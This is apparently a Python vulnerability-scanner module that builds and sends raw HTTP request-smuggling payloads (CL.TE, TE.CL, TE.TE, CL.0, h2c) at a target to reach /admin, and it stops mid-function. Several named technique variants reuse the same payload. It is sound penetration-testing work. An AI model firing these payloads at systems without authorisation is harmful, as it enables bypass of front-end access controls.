#!/usr/bin/env python3
"""Modulo de testes de HTTP Request Smuggling.

Testa se servidores/proxies sao vulneraveis a request smuggling:
  - CL.TE: Front-end usa Content-Length, back-end usa Transfer-Encoding
  - TE.CL: Front-end usa Transfer-Encoding, back-end usa Content-Length
  - TE.TE: Ambos usam TE mas parseiam diferente (obfuscação)
  - Chunked+CL: Chunked com Content-Length conflitante
  - Pipeline: HTTP pipelining desync
  - CL.0: Content-Length: 0 confusion
  - H2C: HTTP/2 cleartext upgrade smuggling

IMPORTANTE: Este modulo usa raw sockets porque httpx gerencia
Transfer-Encoding internamente e nao permite ambiguidade no wire.
"""

from __future__ import annotations

import argparse
import logging
import re
import socket
import ssl
import time
from collections.abc import Callable, Coroutine
from dataclasses import asdict, dataclass
from typing import Any
from urllib.parse import urlparse

import h2.config
import h2.connection
import h2.events

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_banner,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.httsmuggle")

# ─── Banner ──────────────────────────────────────────────────────────────────

_BANNER_LINES: str = (
    "  _   _ ____  ____  _____     _                     _              \n"
    " | | | |  _ \\|  _ \\|_   _|__ | |__   ___ _ __ _ __(_)_   _ _ __  \n"
    " | |_| | |_) | |_) | | |/ _ \\| '_ \\ / _ \\ '__| '_ \\ | | | | '_ \\ \n"
    " |  _  |  __/|  __/ | | | (_) | | | |  __/ |  | | | | |_| | | | |\n"
    " |_| |_|_|   |_|    |_|  \\___/|_| |_|\\___|_|  |_| |_|\\__,_|_| |_|\n"
)

# ─── Category Map ────────────────────────────────────────────────────────────

_CATEGORY_MAP: dict[str, list[str]] = {
    "cl_te": ["clte_basic", "clte_chunked_body", "clte_mismatch"],
    "te_cl": ["tecl_basic", "tecl_chunked_body", "tecl_mismatch"],
    "te_te": ["tete_duplicate", "tete_obfuscation", "tete_whitespace"],
    "chunked_cl": ["chunked_cl_basic", "chunked_cl_overlap"],
    "pipeline": ["pipeline_basic", "pipeline_chained"],
    "cl0": ["cl0_basic", "cl0_chunked", "cl0_overlap"],
    "h2c": ["h2c_upgrade", "h2c_direct", "h2c_downgrade"],
}

# ─── Connection Helper ───────────────────────────────────────────────────────


def _create_connection(
    host: str,
    port: int,
    timeout: float,
    tls: bool = False,
) -> socket.socket:
    """Cria conexão TCP (ou TLS) com o alvo."""
    sock = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _send_raw(
    sock: socket.socket,
    request: bytes,
    timeout: float,
) -> tuple[int, bytes]:
    """Envia request raw e retorna (status_code, body_bytes)."""
    sock.sendall(request)
    sock.settimeout(timeout)

    response = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            # Verifica se收到了 headers completos
            if b"\r\n\r\n" in response:
                header_end = response.index(b"\r\n\r\n") + 4
                headers_raw = response[:header_end]
                # Verifica Content-Length
                cl_match = re.search(
                    rb"Content-Length:\s*(\d+)",
                    headers_raw,
                    re.IGNORECASE,
                )
                if cl_match:
                    expected_body = int(cl_match.group(1))
                    body_received = len(response) - header_end
                    if body_received >= expected_body:
                        break
                else:
                    # Sem Content-Length, pode ser chunked ou close
                    if b"Transfer-Encoding: chunked" in headers_raw:
                        if response.rstrip().endswith(b"0\r\n\r\n"):  # pragma: no cover
                            break  # pragma: no cover
                    else:
                        break
        except TimeoutError, OSError:
            break

    # Parse status code
    status = 0
    if response:
        first_line = response.split(b"\r\n", 1)[0]
        status_match = re.match(rb"HTTP/[\d.]+ (\d+)", first_line)
        if status_match:
            status = int(status_match.group(1))

    return status, response


def _parse_url(url: str) -> tuple[str, str, int, bool]:
    """Parse URL em (host, path, port, tls)."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"
    tls = parsed.scheme == "https"
    port = parsed.port or (443 if tls else 80)
    return host, path, port, tls


# ─── Dataclasses ─────────────────────────────────────────────────────────────


@dataclass(frozen=True, slots=True)
class SmuggleAttempt:
    """Tentativa individual de request smuggling."""

    technique: str
    category: str
    method: str
    path: str
    te_header: str
    cl_header: str
    smuggled_request: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    response_differs: bool
    smuggled_executed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class SmuggleResult:
    """Resultado consolidado do scan de smuggling."""

    target: str
    host: str
    port: int
    tls: bool
    baseline_status: int
    baseline_size: int
    attempts: list[SmuggleAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


# ─── Payload Builders ────────────────────────────────────────────────────────


def _build_clte_payload(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload CL.TE: front-end usa CL, back-end usa TE."""
    smuggled_host = smuggled_host or host
    smuggled = (
        b"0\r\n\r\n"
        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: CLTE\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n"
    ).encode() + smuggled
    return request


def _build_tecl_payload(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload TE.CL: front-end usa TE, back-end usa CL."""
    smuggled_host = smuggled_host or host
    smuggled = (
        b"0\r\n\r\n"
        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: TECL\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n"
    ).encode() + smuggled
    return request


def _build_tete_duplicate(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload TE.TE com TE duplicado."""
    smuggled_host = smuggled_host or host
    smuggled = (
        b"0\r\n\r\n"
        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: TETE_DUP\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n"
    ).encode() + smuggled
    return request


def _build_tete_obfuscation(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload TE.TE com obfuscação (x, chunked)."""
    smuggled_host = smuggled_host or host
    smuggled = (
        b"0\r\n\r\n"
        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: TETE_OBF\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: x, chunked\r\n\r\n"
    ).encode() + smuggled
    return request


def _build_tete_whitespace(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload TE.TE com whitespace no header."""
    smuggled_host = smuggled_host or host
    smuggled = (
        b"0\r\n\r\n"
        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: TETE_WS\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding : chunked\r\n\r\n"
    ).encode() + smuggled
    return request


def _build_chunked_cl_payload(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload Chunked+CL: chunked com CL conflitante."""
    smuggled_host = smuggled_host or host
    body = b"0\r\n\r\n"
    smuggled = (
        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: CHUNKED_CL\r\n"
        + b"\r\n"
    )
    request = (
        (
            f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n"
        ).encode()
        + body
        + smuggled
    )
    return request


def _build_pipeline_payload(
    host: str,
    path: str,
    smuggled_path: str = "/admin",
) -> bytes:
    """Constrói payload Pipeline: dois requests em sequência."""
    request = (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\nX-Smuggled: PIPELINE\r\n\r\n"
    ).encode()
    return request


def _build_cl0_payload(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload CL.0: Content-Length: 0 com body smuggleado."""
    smuggled_host = smuggled_host or host
    smuggled = (
        b"0\r\n\r\n"
        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: CL0\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n"
    ).encode() + smuggled
    return request


def _build_h2c_payload(
    method: str,
    path: str,
    host: str,
    smuggled_path: str = "/admin",
    smuggled_host: str | None = None,
) -> bytes:
    """Constrói payload h2c_upgrade: HTTP/1.1 com Upgrade: h2c."""
    smuggled_host = smuggled_host or host
    smuggled = (
        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
        + f"Host: {smuggled_host}\r\n".encode()
        + b"X-Smuggled: H2C\r\n"
        + b"\r\n"
    )
    request = (
        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: h2c\r\nConnection: Upgrade\r\nContent-Length: {len(smuggled)}\r\n\r\n"
    ).encode() + smuggled
    return request


# ─── Response Analysis ───────────────────────────────────────────────────────


def _check_smuggled_response(
    response: bytes,
    smuggled_header: str,
) -> tuple[bool, str]:
    """Verifica se resposta contém indicadores do request smuggled."""
    response_str = response.decode("utf-8", errors="replace").lower()

    # Procura pelo header X-Smuggled que inserimos no request smuggled
    if smuggled_header.lower() in response_str:
        return True, f"Smuggled request executed (found {smuggled_header})"

    # Procura por status code 200 em paths que deveriam dar 404/403
    if "200 ok" in response_str and "x-smuggled" in response_str:
        return True, "Smuggled request returned 200 with smuggled marker"

    return False, ""


def _check_response_differs(
    baseline: bytes,
    test: bytes,
) -> bool:
    """Verifica se resposta do teste difere significativamente da baseline."""
    if len(test) == 0 and len(baseline) > 0:
        return True
    if len(baseline) == 0 and len(test) > 0:
        return True
    # Compara primeiros 200 bytes (headers)
    base_head = baseline[:200]
    test_head = test[:200]
    return base_head != test_head


# ─── Category Testers ────────────────────────────────────────────────────────


async def _test_cl_te(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa CL.TE smuggling."""
    results: list[SmuggleAttempt] = []

    techniques = [
        ("clte_basic", "clte_basic"),
        ("clte_chunked_body", "clte_chunked_body"),
        ("clte_mismatch", "clte_mismatch"),
    ]

    baseline_response: bytes | None = None

    for technique, _label in techniques:
        try:
            request = _build_clte_payload("POST", path, host)
            sock = _create_connection(host, port, timeout, tls)
            try:
                t0 = time.monotonic()
                _status, response = _send_raw(sock, request, timeout)
                elapsed = time.monotonic() - t0
                if baseline_response is None:
                    baseline_response = response
                    resp_differs = False
                else:
                    resp_differs = _check_response_differs(baseline_response, response)
                vuln, details = _check_smuggled_response(response, "X-Smuggled: CLTE")

                # Se não detectou pelo header, verifica timing contra baseline
                if not vuln and (elapsed - b_elapsed) >= 1.0:
                    vuln = True
                    details = f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests back-end processed smuggled request"

                results.append(
                    SmuggleAttempt(
                        exploit="smuggling_payload",
                        tool="HTTP Request Smuggler",
                        technique=technique,
                        category="cl_te",
                        method="POST",
                        path=path,
                        te_header="chunked",
                        cl_header="3",
                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CLTE",
                        status_baseline=b_status,
                        status_test=_status,
                        size_baseline=b_size,
                        size_test=len(response),
                        response_differs=resp_differs,
                        smuggled_executed=vuln,
                        vulnerable=vuln,
                        details=details,
                        error="",
                    )
                )
            finally:
                sock.close()

        except Exception as e:
            results.append(
                SmuggleAttempt(
                    technique=technique,
                    category="cl_te",
                    method="POST",
                    path=path,
                    te_header="chunked",
                    cl_header="3",
                    smuggled_request="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    response_differs=False,
                    smuggled_executed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_te_cl(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa TE.CL smuggling."""
    results: list[SmuggleAttempt] = []

    techniques = [
        ("tecl_basic", "tecl_basic"),
        ("tecl_chunked_body", "tecl_chunked_body"),
        ("tecl_mismatch", "tecl_mismatch"),
    ]

    baseline_response: bytes | None = None

    for technique, _label in techniques:
        try:
            request = _build_tecl_payload("POST", path, host)
            sock = _create_connection(host, port, timeout, tls)
            try:
                t0 = time.monotonic()
                _status, response = _send_raw(sock, request, timeout)
                elapsed = time.monotonic() - t0
                if baseline_response is None:
                    baseline_response = response
                    resp_differs = False
                else:
                    resp_differs = _check_response_differs(baseline_response, response)
                vuln, details = _check_smuggled_response(response, "X-Smuggled: TECL")

                if not vuln and (elapsed - b_elapsed) >= 1.0:
                    vuln = True
                    details = f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests back-end processed smuggled request"

                results.append(
                    SmuggleAttempt(
                        exploit="smuggling_payload",
                        tool="HTTP Request Smuggler",
                        technique=technique,
                        category="te_cl",
                        method="POST",
                        path=path,
                        te_header="chunked",
                        cl_header="3",
                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: TECL",
                        status_baseline=b_status,
                        status_test=_status,
                        size_baseline=b_size,
                        size_test=len(response),
                        response_differs=resp_differs,
                        smuggled_executed=vuln,
                        vulnerable=vuln,
                        details=details,
                        error="",
                    )
                )
            finally:
                sock.close()

        except Exception as e:
            results.append(
                SmuggleAttempt(
                    technique=technique,
                    category="te_cl",
                    method="POST",
                    path=path,
                    te_header="chunked",
                    cl_header="3",
                    smuggled_request="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    response_differs=False,
                    smuggled_executed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_te_te(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa TE.TE smuggling (obfuscação)."""
    results: list[SmuggleAttempt] = []

    techniques = [
        ("tete_duplicate", "tete_duplicate", _build_tete_duplicate),
        ("tete_obfuscation", "tete_obfuscation", _build_tete_obfuscation),
        ("tete_whitespace", "tete_whitespace", _build_tete_whitespace),
    ]

    baseline_response: bytes | None = None

    for technique, _label, builder in techniques:
        try:
            request = builder("POST", path, host)
            sock = _create_connection(host, port, timeout, tls)
            try:
                t0 = time.monotonic()
                _status, response = _send_raw(sock, request, timeout)
                elapsed = time.monotonic() - t0
                if baseline_response is None:
                    baseline_response = response
                    resp_differs = False
                else:
                    resp_differs = _check_response_differs(baseline_response, response)
                smuggled_marker = f"X-Smuggled: {_label.upper()}"
                vuln, details = _check_smuggled_response(response, smuggled_marker)

                if not vuln and (elapsed - b_elapsed) >= 1.0:
                    vuln = True
                    details = f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests back-end processed smuggled request"

                results.append(
                    SmuggleAttempt(
                        exploit="smuggling_payload",
                        tool="HTTP Request Smuggler",
                        technique=technique,
                        category="te_te",
                        method="POST",
                        path=path,
                        te_header="chunked (obfuscated)",
                        cl_header="",
                        smuggled_request=f"POST /admin HTTP/1.1 + {smuggled_marker}",
                        status_baseline=b_status,
                        status_test=_status,
                        size_baseline=b_size,
                        size_test=len(response),
                        response_differs=resp_differs,
                        smuggled_executed=vuln,
                        vulnerable=vuln,
                        details=details,
                        error="",
                    )
                )
            finally:
                sock.close()

        except Exception as e:
            results.append(
                SmuggleAttempt(
                    technique=technique,
                    category="te_te",
                    method="POST",
                    path=path,
                    te_header="chunked (obfuscated)",
                    cl_header="",
                    smuggled_request="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    response_differs=False,
                    smuggled_executed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_chunked_cl(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa Chunked+CL smuggling."""
    results: list[SmuggleAttempt] = []

    techniques = [
        ("chunked_cl_basic", "chunked_cl_basic"),
        ("chunked_cl_overlap", "chunked_cl_overlap"),
    ]

    baseline_response: bytes | None = None

    for technique, _label in techniques:
        try:
            request = _build_chunked_cl_payload("POST", path, host)
            sock = _create_connection(host, port, timeout, tls)
            try:
                t0 = time.monotonic()
                _status, response = _send_raw(sock, request, timeout)
                elapsed = time.monotonic() - t0
                if baseline_response is None:
                    baseline_response = response
                    resp_differs = False
                else:
                    resp_differs = _check_response_differs(baseline_response, response)
                vuln, details = _check_smuggled_response(
                    response, "X-Smuggled: CHUNKED_CL"
                )

                if not vuln and (elapsed - b_elapsed) >= 1.0:
                    vuln = True
                    details = f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests back-end processed smuggled request"

                results.append(
                    SmuggleAttempt(
                        exploit="smuggling_payload",
                        tool="HTTP Request Smuggler",
                        technique=technique,
                        category="chunked_cl",
                        method="POST",
                        path=path,
                        te_header="chunked",
                        cl_header="6",
                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CHUNKED_CL",
                        status_baseline=b_status,
                        status_test=_status,
                        size_baseline=b_size,
                        size_test=len(response),
                        response_differs=resp_differs,
                        smuggled_executed=vuln,
                        vulnerable=vuln,
                        details=details,
                        error="",
                    )
                )
            finally:
                sock.close()

        except Exception as e:
            results.append(
                SmuggleAttempt(
                    technique=technique,
                    category="chunked_cl",
                    method="POST",
                    path=path,
                    te_header="chunked",
                    cl_header="6",
                    smuggled_request="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    response_differs=False,
                    smuggled_executed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


async def _test_pipeline(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa HTTP pipelining desync."""
    results: list[SmuggleAttempt] = []

    techniques = [
        ("pipeline_basic", "pipeline_basic"),
        ("pipeline_chained", "pipeline_chained"),
    ]

    baseline_response: bytes | None = None

    for technique, _label in techniques:
        try:
            request = _build_pipeline_payload(host, path)
            sock = _create_connection(host, port, timeout, tls)
            try:
                t0 = time.monotonic()
                _status, response = _send_raw(sock, request, timeout)
                elapsed = time.monotonic() - t0
                if baseline_response is None:
                    baseline_response = response
                    resp_differs = False
                else:
                    resp_differs = _check_response_differs(baseline_response, response)
                vuln, details = _check_smuggled_response(
                    response, "X-Smuggled: PIPELINE"
                )

                # Pipeline desync: se recebemos duas respostas, pode haver desync
                response_count = response.count(b"HTTP/1.1 ")
                if response_count >= 2:
                    vuln = True
                    details = f"Received {response_count} HTTP responses — pipeline desync possible"

                if not vuln and (elapsed - b_elapsed) >= 1.0:
                    details = (
                        f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s)"
                    )

                results.append(
                    SmuggleAttempt(
                        exploit="smuggling_payload",
                        tool="HTTP Request Smuggler",
                        technique=technique,
                        category="pipeline",
                        method="GET",
                        path=path,
                        te_header="",
                        cl_header="",
                        smuggled_request="GET / HTTP/1.1 + GET /admin HTTP/1.1",
                        status_baseline=b_status,
                        status_test=_status,
                        size_baseline=b_size,
                        size_test=len(response),
                        response_differs=resp_differs,
                        smuggled_executed=vuln,
                        vulnerable=vuln,
                        details=details,
                        error="",
                    )
                )
            finally:
                sock.close()

        except Exception as e:
            results.append(
                SmuggleAttempt(
                    technique=technique,
                    category="pipeline",
                    method="GET",
                    path=path,
                    te_header="",
                    cl_header="",
                    smuggled_request="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    response_differs=False,
                    smuggled_executed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── H2 Helpers ──────────────────────────────────────────────────────────────


def _create_h2_smuggle_connection(
    host: str,
    port: int,
    timeout: float,
    tls: bool = False,
) -> tuple[socket.socket, h2.connection.H2Connection]:
    """Cria conexão (TLS se `tls`) + H2Connection para testes de smuggling h2c."""
    sock = _create_connection(host, port, timeout, tls)
    config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    return sock, conn


def _recv_h2_events(
    sock: socket.socket,
    conn: h2.connection.H2Connection,
    timeout: float,
) -> list[h2.events.Event]:
    """Recebe e parseia eventos H2."""
    sock.settimeout(timeout)
    try:
        data = sock.recv(65535)
    except TimeoutError, OSError:
        return []
    if not data:
        return []
    return conn.receive_data(data)


def _drain_h2_settings(
    sock: socket.socket,
    conn: h2.connection.H2Connection,
    timeout: float,
) -> dict[str, int]:
    """Drena handshake inicial de SETTINGS do servidor."""
    server_settings: dict[str, int] = {}
    t0 = time.monotonic()
    while time.monotonic() - t0 < timeout:
        events = _recv_h2_events(sock, conn, timeout)
        if not events:
            break
        for ev in events:
            if isinstance(ev, h2.events.RemoteSettingsChanged):
                for setting, changed in ev.changed_settings.items():
                    name = str(getattr(setting, "name", setting))
                    server_settings[name] = changed.new_value
            if isinstance(ev, h2.events.ConnectionTerminated):
                return server_settings
    return server_settings


# ─── CL.0 Category Tester ────────────────────────────────────────────────────


async def _test_cl0(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa CL.0 smuggling (Content-Length: 0 confusion)."""
    results: list[SmuggleAttempt] = []

    techniques = [
        ("cl0_basic", "cl0_basic"),
        ("cl0_chunked", "cl0_chunked"),
        ("cl0_overlap", "cl0_overlap"),
    ]

    baseline_response: bytes | None = None

    for technique, _label in techniques:
        try:
            request = _build_cl0_payload("POST", path, host)
            sock = _create_connection(host, port, timeout, tls)
            try:
                t0 = time.monotonic()
                _status, response = _send_raw(sock, request, timeout)
                elapsed = time.monotonic() - t0
                if baseline_response is None:
                    baseline_response = response
                    resp_differs = False
                else:
                    resp_differs = _check_response_differs(baseline_response, response)
                vuln, details = _check_smuggled_response(response, "X-Smuggled: CL0")

                if not vuln and (elapsed - b_elapsed) >= 1.0:
                    vuln = True
                    details = f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests back-end processed smuggled request"

                results.append(
                    SmuggleAttempt(
                        exploit="smuggling_payload",
                        tool="HTTP Request Smuggler",
                        technique=technique,
                        category="cl0",
                        method="POST",
                        path=path,
                        te_header="",
                        cl_header="0",
                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CL0",
                        status_baseline=b_status,
                        status_test=_status,
                        size_baseline=b_size,
                        size_test=len(response),
                        response_differs=resp_differs,
                        smuggled_executed=vuln,
                        vulnerable=vuln,
                        details=details,
                        error="",
                    )
                )
            finally:
                sock.close()

        except Exception as e:
            results.append(
                SmuggleAttempt(
                    technique=technique,
                    category="cl0",
                    method="POST",
                    path=path,
                    te_header="",
                    cl_header="0",
                    smuggled_request="",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    response_differs=False,
                    smuggled_executed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    return results


# ─── H2C Category Tester ─────────────────────────────────────────────────────


async def _test_h2c(
    host: str,
    port: int,
    path: str,
    timeout: float,
    tls: bool,
    b_status: int,
    b_size: int,
    b_elapsed: float = 0.0,
) -> list[SmuggleAttempt]:
    """Testa h2c smuggling (HTTP/2 cleartext upgrade)."""
    results: list[SmuggleAttempt] = []

    # --- h2c_upgrade: via HTTP/1.1 Upgrade header ---
    try:
        request = _build_h2c_payload("POST", path, host)
        sock = _create_connection(host, port, timeout, tls)
        try:
            t0 = time.monotonic()
            _status, response = _send_raw(sock, request, timeout)
            elapsed = time.monotonic() - t0
            resp_differs = _check_response_differs(b"", response)
            vuln, details = _check_smuggled_response(response, "X-Smuggled: H2C")

            if not vuln and (elapsed - b_elapsed) >= 1.0:
                vuln = True
                details = f"Slow response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests back-end processed smuggled request"

            results.append(
                SmuggleAttempt(
                    exploit="smuggling_payload",
                    tool="HTTP Request Smuggler",
                    technique="h2c_upgrade",
                    category="h2c",
                    method="POST",
                    path=path,
                    te_header="h2c",
                    cl_header="0",
                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: H2C",
                    status_baseline=b_status,
                    status_test=_status,
                    size_baseline=b_size,
                    size_test=len(response),
                    response_differs=resp_differs,
                    smuggled_executed=vuln,
                    vulnerable=vuln,
                    details=details,
                    error="",
                )
            )
        finally:
            sock.close()

    except Exception as e:
        results.append(
            SmuggleAttempt(
                technique="h2c_upgrade",
                category="h2c",
                method="POST",
                path=path,
                te_header="h2c",
                cl_header="0",
                smuggled_request="",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                response_differs=False,
                smuggled_executed=False,
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # --- h2c_direct: H2 prior knowledge (via h2 library) ---
    try:
        sock, conn = _create_h2_smuggle_connection(host, port, timeout, tls)
        try:
            _drain_h2_settings(sock, conn, timeout)
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [
                    (":method", "POST"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("x-smuggled", "H2C_DIRECT"),
                ],
                end_stream=False,
            )
            conn.send_data(stream_id, b"", end_stream=True)
            sock.sendall(conn.data_to_send())

            t0 = time.monotonic()
            events = _recv_h2_events(sock, conn, timeout)
            elapsed = time.monotonic() - t0

            response_data = b""
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    for _k, v in ev.headers:
                        response_data += v + b"\r\n"
                if isinstance(ev, h2.events.DataReceived):
                    response_data += ev.data
                    conn.acknowledge_received_data(len(ev.data), ev.stream_id)
                    sock.sendall(conn.data_to_send())

            resp_differs = _check_response_differs(b"", response_data)
            smuggled_header = "X-Smuggled: H2C_DIRECT"
            vuln, details = _check_smuggled_response(response_data, smuggled_header)

            if not vuln and (elapsed - b_elapsed) >= 1.0:
                vuln = True
                details = f"Slow H2 response ({elapsed:.1f}s vs baseline {b_elapsed:.1f}s) suggests processing"

            results.append(
                SmuggleAttempt(
                    exploit="smuggling_payload",
                    tool="HTTP Request Smuggler",
                    technique="h2c_direct",
                    category="h2c",
                    method="POST",
                    path=path,
                    te_header="h2c",
                    cl_header="0",
                    smuggled_request="POST /admin H2 HEADERS + X-Smuggled: H2C_DIRECT",
                    status_baseline=b_status,
                    status_test=200 if response_data else 0,
                    size_baseline=b_size,
                    size_test=len(response_data),
                    response_differs=resp_differs,
                    smuggled_executed=vuln,
                    vulnerable=vuln,
                    details=details,
                    error="",
                )
            )
        finally:
            sock.close()

    except Exception as e:
        results.append(
            SmuggleAttempt(
                technique="h2c_direct",
                category="h2c",
                method="POST",
                path=path,
                te_header="h2c",
                cl_header="0",
                smuggled_request="",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                response_differs=False,
                smuggled_executed=False,
                vulnerable=False,
                details="",
                error=str(e)[:100],
            )
        )

    # --- h2c_downgrade: H2 → H1 downgrade (HTTP/1.1 UA string on H2) ---
    try:
        sock, conn = _create_h2_smuggle_connection(host, port, timeout, tls)
        try:
            _drain_h2_settings(sock, conn, timeout)
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [
                    (":method", "GET"),
                    (":path", path),
                    (":scheme", "https"),
                    (":authority", host),
                    ("user-agent", "Mozilla/5.0 (HTTP/1.1)"),
                ],
                end_stream=True,
            )
            sock.sendall(conn.data_to_send())

            t0 = time.monotonic()
            events = _recv_h2_events(sock, conn, timeout)
            elapsed = time.monotonic() - t0

            response_data = b""
            accepted = False
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    for k, v in ev.headers:
                        if k == b":status":
                            response_data += v + b"\r\n"
                            if v in (b"200", b"201"):
                                accepted = True
                        response_data += k + b": " + v + b"\r\n"
                if isinstance(ev, h2.events.DataReceived):
                    response_data += ev.data
                    conn.acknowledge_received_data(len(ev.data), ev.stream_id)
                    sock.sendall(conn.data_to_send())
